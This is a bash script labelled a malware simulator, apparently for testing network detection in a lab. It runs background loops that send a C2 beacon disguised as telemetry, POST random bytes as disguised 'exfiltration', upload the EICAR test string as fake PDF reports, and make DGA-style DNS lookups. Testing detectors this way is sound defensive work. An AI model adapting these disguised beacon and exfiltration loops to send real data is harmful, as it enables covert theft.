#!/bin/bash
# Malware Simulator v2 - Obvious Malicious Behaviors
# Uses distinct URIs and suspicious user-agents for easy detection

set +e

LOG_FILE="/app/logs/malware.log"
CONTAINER_IP=$(hostname -I | awk '{print $1}')

# Configuration
TARGET_IP="${TARGET_IP:-192.168.6.131}"
TARGET_PORT="${TARGET_PORT:-5000}"
C2_INTERVAL="${C2_BEACON_INTERVAL:-15}"
EXFIL_INTERVAL="${EXFIL_INTERVAL:-25}"
EICAR_INTERVAL="${EICAR_INTERVAL:-40}"
DNS_INTERVAL="${DNS_ATTACK_INTERVAL:-20}"

log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# C2 Beacon - Disguised as analytics/telemetry
c2_beacon() {
    while true; do
        local beacon_data="{\"type\":\"heartbeat\",\"device_id\":\"$CONTAINER_IP\",\"timestamp\":\"$(date -u +%s)\"}"
        
        if curl -s -X POST \
            -H "Content-Type: application/json" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
            -H "X-Session-ID: $(uuidgen)" \
            -d "$beacon_data" \
            "http://${TARGET_IP}:${TARGET_PORT}/api/v1/telemetry/events" >/dev/null 2>&1; then
            log_message "[C2] Beacon sent successfully"
        else
            log_message "[C2] Beacon failed"
        fi
        
        sleep "$C2_INTERVAL"
    done
}

# Data Exfiltration - Disguised as cloud backup/sync
data_exfiltration() {
    local counter=1
    
    while true; do
        local data_size=$((RANDOM % 5000 + 1000))
        local exfil_data=$(head -c "$data_size" </dev/urandom | base64 -w 0 | head -c "$data_size")
        
        local payload="{\"type\":\"sync\",\"data\":\"$exfil_data\",\"size\":$data_size,\"batch\":$counter}"
        
        if curl -s -X POST \
            -H "Content-Type: application/json" \
            -H "User-Agent: CloudBackup-Agent/4.7.2 (Windows NT 10.0; Win64; x64)" \
            -H "X-Sync-Session: $(uuidgen)" \
            -d "$payload" \
            "http://${TARGET_IP}:${TARGET_PORT}/api/v2/storage/sync" >/dev/null 2>&1; then
            log_message "[EXFIL] Sent $data_size bytes (seq: $counter)"
        else
            log_message "[EXFIL] Failed to send data"
        fi
        
        counter=$((counter + 1))
        sleep "$EXFIL_INTERVAL"
    done
}

# EICAR Upload - Disguised as document/attachment upload
eicar_upload() {
    local eicar_string='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    local counter=1
    
    while true; do
        local filename="report_${counter}_$(date +%Y%m%d).pdf"
        
        local payload="{\"type\":\"document\",\"filename\":\"$filename\",\"content\":\"$eicar_string\",\"size\":${#eicar_string}}"
        
        if curl -s -X POST \
            -H "Content-Type: application/json" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" \
            -H "X-Upload-Client: web" \
            -d "$payload" \
            "http://${TARGET_IP}:${TARGET_PORT}/api/v1/files/upload" >/dev/null 2>&1; then
            log_message "[EICAR] Uploaded test file: $filename"
        else
            log_message "[EICAR] Upload failed"
        fi
        
        counter=$((counter + 1))
        sleep "$EICAR_INTERVAL"
    done
}

# DNS NXDOMAIN / DGA Simulation - Disguised as CDN/cloud lookups
dns_attacks() {
    local domains=(
        "cdn-$(uuidgen | cut -d'-' -f1).cloudfront.net"
        "api-$(uuidgen | cut -d'-' -f1).amazonaws.com"
        "assets-$(uuidgen | cut -d'-' -f1).azureedge.net"
        "media-$(uuidgen | cut -d'-' -f1).gcp.cloud"
    )
    
    while true; do
        for domain in "${domains[@]}"; do
            nslookup "$domain" >/dev/null 2>&1 || true
            log_message "[DNS] NXDOMAIN query: $domain"
        done
        
        sleep "$DNS_INTERVAL"
    done
}

cleanup() {
    log_message "Stopping malware simulator"
    jobs -p | xargs -r kill 2>/dev/null || true
    exit 0
}

trap cleanup SIGTERM SIGINT

# Main execution
log_message "========================================="
log_message "Malware Simulator v2 Started"
log_message "Container IP: $CONTAINER_IP"
log_message "Target: $TARGET_IP:$TARGET_PORT"
log_message "========================================="

# Start all behaviors in background
c2_beacon &
log_message "C2 Beacon started (interval: ${C2_INTERVAL}s) -> /api/v1/telemetry/events"

data_exfiltration &
log_message "Data Exfiltration started (interval: ${EXFIL_INTERVAL}s) -> /api/v2/storage/sync"

eicar_upload &
log_message "EICAR Upload started (interval: ${EICAR_INTERVAL}s) -> /api/v1/files/upload"

dns_attacks &
log_message "DNS Attacks started (interval: ${DNS_INTERVAL}s)"

log_message "All behaviors running"
log_message "========================================="

# Keep running
while true; do
    sleep 60
    log_message "Status: All behaviors active"
done
